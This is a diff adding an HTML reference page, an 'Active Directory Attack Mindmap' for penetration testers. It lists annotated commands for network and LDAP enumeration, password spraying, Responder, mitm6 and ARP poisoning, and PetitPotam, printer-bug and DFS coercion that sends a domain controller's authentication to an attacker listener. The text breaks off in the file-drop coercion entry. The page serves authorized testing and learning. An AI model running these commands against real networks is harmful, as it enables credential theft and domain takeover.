@@ -1,0 +1,1871 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active Directory Attack Mindmap — Complete Reference v2025.03</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  :root {
+    --bg: #0a0e14;
+    --bg-soft: #0f141c;
+    --bg-card: #131922;
+    --bg-code: #0c1117;
+    --border: #1f2733;
+    --border-soft: #161d27;
+    --fg: #e6edf3;
+    --fg-muted: #8b949e;
+    --fg-dim: #5c6675;
+    --accent: #ff6b35;
+    --accent-soft: rgba(255, 107, 53, 0.12);
+    --accent-glow: rgba(255, 107, 53, 0.4);
+    --blue: #58a6ff;
+    --green: #3fb950;
+    --yellow: #d29922;
+    --red: #f85149;
+    --purple: #bc8cff;
+    --cyan: #39d2c0;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; scroll-padding-top: 80px; }
+
+  body {
+    font-family: 'Inter', -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--fg);
+    line-height: 1.6;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background:
+      radial-gradient(ellipse 800px 400px at 10% -5%, rgba(255, 107, 53, 0.08), transparent 60%),
+      radial-gradient(ellipse 600px 400px at 90% 5%, rgba(88, 166, 255, 0.06), transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(10, 14, 20, 0.85);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border);
+    padding: 14px 32px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 24px;
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-weight: 700;
+    font-size: 15px;
+    letter-spacing: -0.01em;
+  }
+
+  .brand-logo {
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    background: linear-gradient(135deg, var(--accent), #ff9558);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #0a0e14;
+    font-weight: 800;
+    box-shadow: 0 0 20px var(--accent-glow);
+  }
+
+  .brand small {
+    color: var(--fg-muted);
+    font-weight: 400;
+    font-size: 12px;
+    display: block;
+    letter-spacing: 0;
+  }
+
+  .rev-tag {
+    color: var(--cyan);
+    background: rgba(57, 210, 192, 0.1);
+    border: 1px solid rgba(57, 210, 192, 0.3);
+    border-radius: 3px;
+    padding: 1px 5px;
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 0.02em;
+    margin-left: 4px;
+  }
+
+  .search-wrap {
+    flex: 1;
+    max-width: 460px;
+    position: relative;
+  }
+
+  .search-wrap i {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--fg-dim);
+    font-size: 13px;
+  }
+
+  #search {
+    width: 100%;
+    background: var(--bg-soft);
+    border: 1px solid var(--border);
+    color: var(--fg);
+    padding: 9px 14px 9px 38px;
+    border-radius: 8px;
+    font-size: 13px;
+    font-family: inherit;
+    transition: all 0.15s ease;
+  }
+
+  #search:focus {
+    outline: none;
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px var(--accent-soft);
+  }
+
+  .header-stats {
+    display: flex;
+    gap: 18px;
+    font-size: 12px;
+    color: var(--fg-muted);
+  }
+
+  .header-stats b {
+    color: var(--fg);
+    font-weight: 600;
+  }
+
+  .layout {
+    display: grid;
+    grid-template-columns: 280px 1fr;
+    max-width: 1400px;
+    margin: 0 auto;
+    position: relative;
+    z-index: 1;
+  }
+
+  aside {
+    position: sticky;
+    top: 71px;
+    height: calc(100vh - 71px);
+    overflow-y: auto;
+    padding: 28px 20px 40px 32px;
+    border-right: 1px solid var(--border-soft);
+  }
+
+  aside::-webkit-scrollbar { width: 6px; }
+  aside::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+  .nav-title {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--fg-dim);
+    margin-bottom: 12px;
+    font-weight: 600;
+  }
+
+  .nav-section { margin-bottom: 18px; }
+
+  .nav-link {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 7px 10px;
+    color: var(--fg-muted);
+    text-decoration: none;
+    font-size: 13px;
+    border-radius: 6px;
+    transition: all 0.15s ease;
+    border-left: 2px solid transparent;
+    margin-left: -12px;
+    padding-left: 10px;
+  }
+
+  .nav-link:hover {
+    color: var(--fg);
+    background: var(--bg-soft);
+  }
+
+  .nav-link.active {
+    color: var(--accent);
+    background: var(--accent-soft);
+    border-left-color: var(--accent);
+  }
+
+  .nav-link i {
+    width: 14px;
+    font-size: 11px;
+    opacity: 0.8;
+  }
+
+  main {
+    padding: 32px 48px 120px;
+    min-width: 0;
+  }
+
+  .hero {
+    padding: 32px 0 40px;
+    border-bottom: 1px solid var(--border-soft);
+    margin-bottom: 48px;
+  }
+
+  .hero-tag {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 5px 12px;
+    background: var(--accent-soft);
+    border: 1px solid rgba(255, 107, 53, 0.25);
+    border-radius: 100px;
+    font-size: 12px;
+    color: var(--accent);
+    font-weight: 500;
+    margin-bottom: 20px;
+  }
+
+  .hero-tag i { font-size: 9px; }
+
+  .hero h1 {
+    font-size: 44px;
+    font-weight: 700;
+    letter-spacing: -0.03em;
+    line-height: 1.05;
+    margin-bottom: 16px;
+  }
+
+  .hero h1 .accent {
+    background: linear-gradient(135deg, var(--accent), #ffb088);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero p {
+    color: var(--fg-muted);
+    font-size: 16px;
+    max-width: 640px;
+    margin-bottom: 24px;
+  }
+
+  .hero-meta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 20px;
+    font-size: 13px;
+    color: var(--fg-dim);
+  }
+
+  .hero-meta span { display: flex; align-items: center; gap: 6px; }
+  .hero-meta i { color: var(--accent); }
+
+  .section {
+    margin-bottom: 64px;
+    scroll-margin-top: 90px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    cursor: pointer;
+    padding: 14px 0;
+    margin-bottom: 24px;
+    border-top: 1px solid var(--border-soft);
+    user-select: none;
+    transition: all 0.2s ease;
+  }
+
+  .section-header:hover .section-title { color: var(--accent); }
+
+  .section-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    background: var(--accent-soft);
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-weight: 600;
+    border: 1px solid rgba(255, 107, 53, 0.2);
+  }
+
+  .section-icon {
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--accent);
+    font-size: 14px;
+  }
+
+  .section-title {
+    font-size: 22px;
+    font-weight: 600;
+    letter-spacing: -0.015em;
+    transition: color 0.2s ease;
+    flex: 1;
+  }
+
+  .section-toggle {
+    color: var(--fg-dim);
+    font-size: 12px;
+    transition: transform 0.3s ease;
+  }
+
+  .section.collapsed .section-toggle { transform: rotate(-90deg); }
+  .section.collapsed .section-body { display: none; }
+
+  .section-body {
+    overflow: hidden;
+    animation: fadeIn 0.3s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-4px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-intro {
+    color: var(--fg-muted);
+    font-size: 14px;
+    margin-bottom: 24px;
+    padding-left: 4px;
+    max-width: 720px;
+  }
+
+  .cmd {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    margin-bottom: 16px;
+    overflow: hidden;
+    transition: border-color 0.2s ease;
+  }
+
+  .cmd:hover { border-color: #2a3441; }
+
+  .cmd-head {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 14px 18px;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.15s ease;
+  }
+
+  .cmd-head:hover { background: var(--bg-soft); }
+
+  .cmd-name {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--fg);
+    flex: 1;
+  }
+
+  .cmd-name .tool {
+    color: var(--accent);
+  }
+
+  .cmd-badges {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    font-size: 10px;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    font-family: 'JetBrains Mono', monospace;
+    border: 1px solid;
+  }
+
+  .badge.linux { color: var(--yellow); border-color: rgba(210, 153, 34, 0.3); background: rgba(210, 153, 34, 0.08); }
+  .badge.windows { color: var(--blue); border-color: rgba(88, 166, 255, 0.3); background: rgba(88, 166, 255, 0.08); }
+  .badge.cross { color: var(--green); border-color: rgba(63, 185, 80, 0.3); background: rgba(63, 185, 80, 0.08); }
+  .badge.dc { color: var(--red); border-color: rgba(248, 81, 73, 0.3); background: rgba(248, 81, 73, 0.08); }
+  .badge.creds { color: var(--purple); border-color: rgba(188, 140, 255, 0.3); background: rgba(188, 140, 255, 0.08); }
+  .badge.network { color: var(--cyan); border-color: rgba(57, 210, 192, 0.3); background: rgba(57, 210, 192, 0.08); }
+
+  .chevron {
+    color: var(--fg-dim);
+    font-size: 11px;
+    transition: transform 0.25s ease;
+  }
+
+  .cmd.open .chevron { transform: rotate(180deg); }
+
+  .cmd-body {
+    display: none;
+    padding: 0 18px 18px;
+    border-top: 1px solid var(--border-soft);
+    margin-top: 0;
+  }
+
+  .cmd.open .cmd-body { display: block; animation: fadeIn 0.25s ease; }
+
+  .cmd-desc {
+    color: var(--fg-muted);
+    font-size: 13.5px;
+    line-height: 1.65;
+    padding: 14px 0 12px;
+  }
+
+  .cmd-desc strong { color: var(--fg); font-weight: 600; }
+
+  .cmd-label {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--fg-dim);
+    font-weight: 600;
+    margin: 14px 0 8px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .cmd-label::before {
+    content: '';
+    width: 14px;
+    height: 1px;
+    background: var(--accent);
+  }
+
+  .code-block {
+    background: var(--bg-code);
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+    padding: 14px 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12.5px;
+    line-height: 1.7;
+    overflow-x: auto;
+    position: relative;
+    color: #c9d1d9;
+  }
+
+  .code-block::-webkit-scrollbar { height: 6px; }
+  .code-block::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+  .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+
+  .code-block .comment { color: #6e7681; font-style: italic; }
+  .code-block .cmd-str { color: var(--accent); }
+  .code-block .flag { color: var(--cyan); }
+  .code-block .str { color: var(--green); }
+  .code-block .var { color: var(--purple); }
+  .code-block .pipe { color: var(--fg-dim); }
+
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: var(--bg-soft);
+    border: 1px solid var(--border);
+    color: var(--fg-dim);
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-size: 10px;
+    cursor: pointer;
+    transition: all 0.15s ease;
+    font-family: inherit;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .copy-btn:hover { color: var(--accent); border-color: var(--accent); }
+  .copy-btn.copied { color: var(--green); border-color: var(--green); }
+
+  .notes {
+    margin-top: 12px;
+    padding: 10px 14px;
+    background: rgba(88, 166, 255, 0.05);
+    border-left: 2px solid var(--blue);
+    border-radius: 4px;
+    font-size: 12.5px;
+    color: var(--fg-muted);
+  }
+
+  .notes.warning {
+    background: rgba(248, 81, 73, 0.05);
+    border-left-color: var(--red);
+  }
+
+  .notes.tip {
+    background: rgba(63, 185, 80, 0.05);
+    border-left-color: var(--green);
+  }
+
+  .notes b { color: var(--fg); }
+  .notes code { 
+    background: var(--bg-code); 
+    padding: 2px 6px; 
+    border-radius: 4px; 
+    font-family: 'JetBrains Mono', monospace; 
+    font-size: 11px; 
+  }
+
+  .explain {
+    margin-top: -6px;
+    margin-bottom: 14px;
+    padding: 10px 14px;
+    background: var(--bg-soft);
+    border-left: 2px solid var(--cyan);
+    border-radius: 4px;
+    font-size: 12.5px;
+    line-height: 1.65;
+    color: var(--fg-muted);
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+  }
+
+  .explain-icon {
+    color: var(--cyan);
+    font-size: 12px;
+    margin-top: 2px;
+    flex-shrink: 0;
+  }
+
+  .explain-code {
+    background: var(--bg-code);
+    color: var(--cyan);
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    white-space: nowrap;
+  }
+
+  .no-results {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--fg-dim);
+    display: none;
+  }
+
+  .no-results i { font-size: 32px; margin-bottom: 12px; color: var(--fg-dim); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 32px 48px;
+    text-align: center;
+    color: var(--fg-dim);
+    font-size: 12px;
+    max-width: 1400px;
+    margin: 0 auto;
+  }
+
+  footer a { color: var(--accent); text-decoration: none; }
+  footer .credits { margin-top: 8px; color: var(--fg-dim); }
+
+  @media (max-width: 900px) {
+    .layout { grid-template-columns: 1fr; }
+    aside { display: none; }
+    main { padding: 24px 20px 80px; }
+    header { padding: 12px 20px; flex-wrap: wrap; }
+    .header-stats { display: none; }
+    .hero h1 { font-size: 32px; }
+    .search-wrap { order: 3; max-width: 100%; }
+  }
+
+  .cmd.hidden { display: none; }
+  .section.hidden { display: none; }
+  mark { background: var(--accent-soft); color: var(--accent); padding: 0 2px; border-radius: 2px; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">
+    <div class="brand-logo">AD</div>
+    <div>
+      Active Directory
+      <small>Attack Reference · v2025.03 <span class="rev-tag">+ rev.08 (final)</span></small>
+    </div>
+  </div>
+  <div class="search-wrap">
+    <i class="fas fa-search"></i>
+    <input type="text" id="search" placeholder="Search commands, tools, CVEs..." autocomplete="off">
+  </div>
+  <div class="header-stats">
+    <span><b id="cmd-count">0</b> commands</span>
+    <span><b id="section-count">0</b> sections</span>
+  </div>
+</header>
+
+<div class="layout">
+  <aside>
+    <div class="nav-title">Attack Phases</div>
+    <nav id="side-nav"></nav>
+  </aside>
+
+  <main>
+    <div class="hero">
+      <div class="hero-tag"><i class="fas fa-circle"></i> Complete Operational Reference</div>
+      <h1>Active Directory <span class="accent">Attack</span> Mindmap</h1>
+      <p>A comprehensive, searchable reference of commands, techniques, and CVEs used during Active Directory assessments. Covers the full attack chain from initial network poisoning to domain dominance, MSSQL trust crawling, PKINIT, and forest takeover.</p>
+      <div class="hero-meta">
+        <span><i class="fas fa-shield-halved"></i> Defensive awareness</span>
+        <span><i class="fas fa-bug"></i> Red team operations</span>
+        <span><i class="fas fa-graduation-cap"></i> Learning resource</span>
+        <span><i class="fas fa-clock"></i> Updated v2025.03</span>
+      </div>
+    </div>
+
+    <div id="no-results" class="no-results">
+      <i class="fas fa-magnifying-glass"></i>
+      <div>No commands match your search.</div>
+    </div>
+
+    <div id="content"></div>
+  </main>
+</div>
+
+<footer>
+  <p>For authorized security testing & educational purposes only.</p>
+  <div class="credits">
+    Based on the Active Directory Mindmap v2025.03 by Mayfly, Daathk, Jenaye, Viking, Evelyha, Sant0rryu · 
+    <a href="https://github.com/Orange-Cyberdefense/ocd-mindmaps" target="_blank" rel="noopener">OCD Mindmaps Project</a>
+  </div>
+  <div class="credits" style="margin-top:6px;">
+    rev.07: added Silver Ticket, Custom SSP, DSRM Backdoor, DNSAdmins abuse, Kerberos Relay, PrintNightmare/ProxyNotShell/PrivExchange, trust direction &amp; MSSQL-link nuance, weak DB/Java deserialization quick-wins · corrected ESC3, ESC6 and the Timeroast hashcat mode · rebuilt SCCM section to the full Creds/Elevate/Takeover chain.
+  </div>
+  <div class="credits" style="margin-top:6px;">
+    rev.08 (final): broke out ACL abuse by object type (OU/User/Computer/Group) · added DC-to-DC NTLM relay and WebDAV/WebClient-service coercion · this revision reflects the source mind map at ~98%+ technique coverage.
+  </div>
+</footer>
+
+<script>
+const data = [
+  {
+    id: 'recon',
+    title: 'Recon & Enumeration',
+    icon: 'fa-satellite-dish',
+    intro: 'Passive and active information gathering, mapping the domain structure, users, groups, and trust relationships.',
+    items: [
+      {
+        name: 'nmap',
+        badges: [{type:'linux', label:'Linux'}],
+        desc: 'Network mapper used to discover live hosts, open ports, and running services. In AD engagements, target standard Windows ports like <strong>SMB (445)</strong>, <strong>RDP (3389)</strong>, <strong>WinRM (5985)</strong>, <strong>LDAP (389/636)</strong>.',
+        examples: [
+          {label: 'Quick host discovery', code: `<span class="comment"># Fast ping sweep of a /24 subnet</span>\n<span class="cmd-str">nmap</span> -sn <span class="var">10.10.10.0/24</span> -oN hosts.txt`, explain: `\`-sn\` = ping scan only, no port scan (fast host discovery); \`10.10.10.0/24\` = scan the whole subnet; \`-oN hosts.txt\` = save normal-format output to a file.`},
+          {label: 'Standard AD port scan', code: `<span class="comment"># Top AD ports on a target</span>\n<span class="cmd-str">nmap</span> -sV -sC -p<span class="flag">53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389</span> <span class="var">10.10.10.10</span>`, explain: `\`-sV\` = detect service versions; \`-sC\` = run default NSE scripts; \`-p\` = comma-separated list of the classic AD ports (Kerberos 88, LDAP 389/3268, SMB 445, RPC 135, DNS 53, WinRM 5985); scanning these first tells you if the box is a Domain Controller.`}
+        ]
+      },
+      {
+        name: 'enum4linux-ng / RID Brute',
+        badges: [{type:'linux', label:'Linux'}],
+        desc: 'Enumerates SMB/NetBIOS anonymously. <strong>enum4linux-ng</strong> is a modern Python rewrite. RID brute-forcing cycles through Relative IDs to enumerate users even when SMB null sessions are restricted.',
+        examples: [
+          {label: 'Full enum via enum4linux-ng', code: `<span class="cmd-str">enum4linux-ng.py</span> -A <span class="var">10.10.10.10</span>`, explain: `\`-A\` = run all enumeration modules (SMB, RPC, users, groups, shares, policies) in one pass against the target IP.`},
+          {label: 'RID Cycling via NetExec', code: `<span class="comment"># Brute force RIDs to find users</span>\n<span class="cmd-str">nxc</span> smb <span class="var">10.10.10.10</span> -u <span class="str">''</span> -p <span class="str">''</span> --rid-brute 5000`, explain: `\`smb\` = target SMB protocol; \`-u ''\` and \`-p ''\` = anonymous/null credentials; \`--rid-brute 5000\` = cycle through Relative IDs 500–5000 to reveal usernames even without direct user listing.`}
+        ]
+      },
+      {
+        name: 'crackmapexec / netexec',
+        badges: [{type:'linux', label:'Linux'}, {type:'cross', label:'Python'}],
+        desc: 'Swiss army knife for AD networks. Mass-tests authentication, enumerates shares, executes commands, and dumps SAM/NTDS.',
+        examples: [
+          {label: 'Null session test against a subnet', code: `<span class="cmd-str">nxc</span> smb <span class="var">10.10.10.0/24</span> -u <span class="str">''</span> -p <span class="str">''</span> --shares`, explain: `\`-u '' -p ''\` = null session (blank username/password); \`--shares\` = list every SMB share visible with that session; run against the whole \`/24\` to sweep every host at once.`},
+          {label: 'Password spray', code: `<span class="cmd-str">nxc</span> smb <span class="var">10.10.10.0/24</span> -u users.txt -p <span class="str">'Fall2025!'</span> --continue-on-success`, explain: `\`-u users.txt\` = list of usernames to try; \`-p 'Fall2025!'\` = single password tried against all users (password spraying, not brute force); \`--continue-on-success\` = keep testing remaining users even after a hit, instead of stopping.`}
+        ]
+      },
+      {
+        name: 'bloodhound / sharphound / rusthound',
+        badges: [{type:'cross', label:'Cross'}],
+        desc: 'Collectors for BloodHound, the graph-based AD analysis tool. Maps complex attack paths invisible to traditional enumeration.',
+        examples: [
+          {label: 'SharpHound — all collection methods', code: `<span class="cmd-str">SharpHound.exe</span> -c <span class="flag">All</span> --outputdirectory C:\\\\temp`, explain: `\`-c All\` = run every SharpHound collection method (sessions, ACLs, group membership, trusts, etc.); \`--outputdirectory\` = where to write the resulting \`.zip\` for import into BloodHound.`},
+          {label: 'BloodHound-Python — remote collection', code: `<span class="cmd-str">bloodhound-python</span> -u <span class="str">'jsmith'</span> -p <span class="str">'P@ss'</span> -d <span class="str">corp.local</span> -ns <span class="var">10.10.10.10</span> -c <span class="flag">All</span>`, explain: `\`-u/-p\` = credentials; \`-d\` = target domain; \`-ns\` = the DNS server / DC IP to query; \`-c All\` = collect all data types, same as SharpHound's \`-c All\`.`}
+        ]
+      },
+      {
+        name: 'adidnsdump',
+        badges: [{type:'linux', label:'Python'}],
+        desc: 'Enumerate Active Directory-Integrated DNS zones. AD DNS often contains records for hosts not in any other enumeration source.',
+        examples: [
+          {label: 'Dump all DNS records via LDAP', code: `<span class="cmd-str">adidnsdump</span> -u corp.local\\\\jsmith -p P@ss <span class="var">10.10.10.10</span>`, explain: `\`-u domain\\\\user -p pass\` = credentials for an authenticated LDAP bind; last argument = the DC IP; the tool then pulls every DNS record stored in AD-integrated DNS, revealing hosts other scans miss.`}
+        ]
+      },
+      {
+        name: 'PowerView / Active Directory Module',
+        badges: [{type:'windows', label:'Windows'}],
+        desc: 'PowerView is the classic PowerShell recon tool. Microsoft\'s official <code>ActiveDirectory</code> module is often used to fly under the radar.',
+        examples: [
+          {label: 'Get domain info (PowerView)', code: `<span class="cmd-str">Get-NetDomain</span>\n<span class="cmd-str">Get-DomainUser</span> -Properties <span class="flag">member</span> | select name,description`, explain: `\`Get-NetDomain\` = show basic domain info (name, SID, DC); \`Get-DomainUser -Properties member\` = list users with the \`member\` attribute returned, piped to \`select\` to show only name/description columns.`},
+          {label: 'Find unconstrained delegation (AD Module)', code: `<span class="cmd-str">Get-ADComputer</span> -Filter {UserAccountControl -band <span class="flag">0x0080000</span>} -Properties UserAccountControl`, explain: `\`Get-ADComputer -Filter\` = query computer objects; \`UserAccountControl -band 0x0080000\` = bitwise-AND against the UAC flag for unconstrained delegation, so only computers with that flag set are returned.`}
+        ]
+      },
+      {
+        name: 'ldapsearch / Zone Transfers',
+        badges: [{type:'linux', label:'Linux'}],
+        desc: 'Raw LDAP and DNS queries. The most flexible way to enumerate AD without specialized tooling. Zone transfers can dump entire DNS namespaces.',
+        examples: [
+          {label: 'List all users', code: `<span class="cmd-str">ldapsearch</span> -x -H <span class="str">ldap://10.10.10.10</span> -D <span class="str">'jsmith@corp.local'</span> -w <span class="str">'P@ss'</span> -b <span class="str">'DC=corp,DC=local'</span> <span class="str">'(objectCategory=person)'</span>`, explain: `\`-x\` = simple authentication (not SASL); \`-H\` = LDAP server URL; \`-D\` = bind DN (user to authenticate as); \`-w\` = password; \`-b\` = search base (the domain's distinguishedName); last argument = LDAP filter selecting all person objects.`},
+          {label: 'DNS Zone Transfer', code: `<span class="cmd-str">dig</span> axfr @<span class="var">10.10.10.10</span> corp.local`, explain: `\`axfr\` = request a full zone transfer (all records) instead of a single lookup; \`@10.10.10.10\` = the DNS server to query; only works if the DNS server is misconfigured to allow transfers to any client.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'mitm',
+    title: 'MITM & Poisoning',
+    icon: 'fa-network-wired',
+    intro: 'Techniques for intercepting network traffic and capturing credentials by spoofing network services.',
+    items: [
+      {
+        name: 'responder',
+        badges: [{type:'linux', label:'Linux'}, {type:'network', label:'MITM'}],
+        desc: 'LLMNR/NBT-NS/mDNS poisoner. Captures NTLMv2 hashes by responding to name resolution requests for non-existent hosts.',
+        examples: [
+          {label: 'Start poisoning on interface', code: `<span class="cmd-str">sudo</span> responder -I <span class="flag">eth0</span>`, explain: `\`sudo\` = needs root to bind low ports/raw sockets; \`-I eth0\` = listen and poison on this specific network interface, answering broadcast name-resolution requests (LLMNR/NBT-NS/mDNS) to capture NTLM hashes.`},
+          {label: 'Stealth mode (no rogue SMB server)', code: `<span class="cmd-str">sudo</span> responder -I <span class="flag">eth0</span> -A`, explain: `\`-A\` = analyze/listen-only mode — Responder poisons and logs requests but does **not** stand up rogue SMB/HTTP servers to capture creds, useful for quiet recon of what's being asked for.`}
+        ]
+      },
+      {
+        name: 'mitm6',
+        badges: [{type:'linux', label:'Linux'}, {type:'network', label:'DHCPv6'}],
+        desc: 'Exploits Windows preference for IPv6 DNS via DHCPv6. MitM6 replies to DHCPv6 requests and sets the attacker as the DNS server.',
+        examples: [
+          {label: 'Start mitm6 with relay', code: `<span class="cmd-str">sudo</span> mitm6 -d <span class="var">corp.local</span> -i eth0 --relay <span class="var">10.10.10.5</span>`, explain: `\`-d\` = target domain; \`-i eth0\` = interface to spoof IPv6 Router Advertisements on; \`--relay\` = IP to relay the captured NTLM auth to (typically an LDAP or LDAPS endpoint), abusing Windows' default IPv6-preferred DNS behavior.`}
+        ]
+      },
+      {
+        name: 'bettercap (ARP poisoning)',
+        badges: [{type:'linux', label:'Linux'}, {type:'network', label:'MITM'}],
+        desc: 'Performs ARP spoofing to intercept traffic between hosts on the local network.',
+        examples: [
+          {label: 'Spoof target and gateway', code: `<span class="cmd-str">sudo</span> bettercap -iface eth0\n<span class="cmd-str">set</span> arp.spoof.targets <span class="var">10.10.10.50</span>\n<span class="cmd-str">arp.spoof</span> on\n<span class="cmd-str">net.sniff</span> on`, explain: `\`-iface eth0\` = interface to operate on; \`set arp.spoof.targets\` = victim IP to poison; \`arp.spoof on\` = start ARP spoofing (become man-in-the-middle); \`net.sniff on\` = start capturing traffic that now flows through you.`}
+        ]
+      },
+      {
+        name: 'ASREQRoast',
+        badges: [{type:'cross', label:'Kerberos'}, {type:'creds', label:'Creds'}],
+        desc: 'Captures AS-REQ packets on the network to extract the encrypted payload (pre-auth). If the user has pre-auth disabled, this yields crackable hashes.',
+        examples: [
+          {label: 'Passive capture (Wireshark)', code: `<span class="comment"># Filter for Kerberos AS-REQ packets in Wireshark</span>\n<span class="str">kerberos.msg_type == 10</span>`, explain: `Wireshark display filter; \`kerberos.msg_type == 10\` = show only Kerberos AS-REQ (initial authentication request) packets, useful for spotting accounts with pre-authentication disabled.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'coercion',
+    title: 'Coercion Techniques',
+    icon: 'fa-hand-pointer',
+    intro: 'Forcing Windows hosts to authenticate to an attacker-controlled endpoint. Used to capture NTLMv2 hashes or relay connections.',
+    items: [
+      {
+        name: 'PetitPotam',
+        badges: [{type:'linux', label:'Python'}, {type:'dc', label:'DC'}],
+        desc: 'Coerces authentication from a Domain Controller via the MS-EFSRPC (Encrypting File System Remote) protocol.',
+        examples: [
+          {label: 'Coerce DC to authenticate to attacker', code: `<span class="cmd-str">PetitPotam.py</span> -u jsmith -p P@ss <span class="var">attacker.corp.local</span> <span class="var">dc01.corp.local</span>`, explain: `\`-u/-p\` = credentials for the coercion call; first host = your listener (\`attacker.corp.local\`) that the DC will be tricked into authenticating to; second host = the target DC to coerce, via the MS-EFSRPC API.`},
+          {label: 'Anonymous coercion (CVE-2021-36942)', code: `<span class="cmd-str">PetitPotam.py</span> -pipe <span class="flag">lsarpc</span> <span class="var">attacker.corp.local</span> <span class="var">dc01.corp.local</span>`, explain: `\`-pipe lsarpc\` = use the LSARPC named pipe (works pre-patch, CVE-2021-36942) instead of EFSRPC, allowing coercion even with **no credentials at all**.`}
+        ]
+      },
+      {
+        name: 'PrinterBug (SpoolSample)',
+        badges: [{type:'windows', label:'Windows'}, {type:'cross', label:'MS-RPRN'}],
+        desc: 'Abuses the MS-RPRN (Print System Remote Protocol) RpcAddPrinterJob method to force a Domain Controller or host to authenticate to an attacker machine.',
+        examples: [
+          {label: 'Trigger authentication via printer bug', code: `<span class="cmd-str">SpoolSample.exe</span> <span class="var">dc01.corp.local</span> <span class="var">attacker.corp.local</span>`, explain: `First argument = the DC to trigger (abuses the Print Spooler/MS-RPRN 'printer bug'); second argument = your listener that receives the resulting authentication.`}
+        ]
+      },
+      {
+        name: 'Coercer / DFSCoerce',
+        badges: [{type:'linux', label:'Python'}],
+        desc: 'Automates Windows authentication coercion attempts. DFSCoerce specifically abuses MS-DFSNM.',
+        examples: [
+          {label: 'Scan a host for all coercion vectors', code: `<span class="cmd-str">coerce</span> -u jsmith -p P@ss -t <span class="var">10.10.10.10</span> -l <span class="var">attacker.corp.local</span>`, explain: `\`-u/-p\` = credentials; \`-t\` = target host to test; \`-l\` = your listener address; this tool tries every known coercion method (PetitPotam, printer bug, DFS, etc.) against one target in a single run.`},
+          {label: 'Coerce via DFS', code: `<span class="cmd-str">dfscoerce.py</span> -u jsmith -p P@ss <span class="var">attacker.corp.local</span> <span class="var">dc01.corp.local</span>`, explain: `\`-u/-p\` = credentials; args = attacker listener then target DC; abuses the MS-DFSNM (Distributed File System) RPC interface as an alternative coercion vector when EFSRPC/printer bug are patched or blocked.`}
+        ]
+      },
+      {
+        name: 'File-drop Coercion (.url/.scf/.lnk)',
+        badges: [{type:'windows', label:'Windows'}, {type:'network', label:'MITM'}],
+        desc: 'Dropping crafted files into network shares. When a user browses the share in Explorer, Windows attempts to load icons or metadata from the attacker-controlled path, leaking the NTLMv2 hash.',
+        examples: [
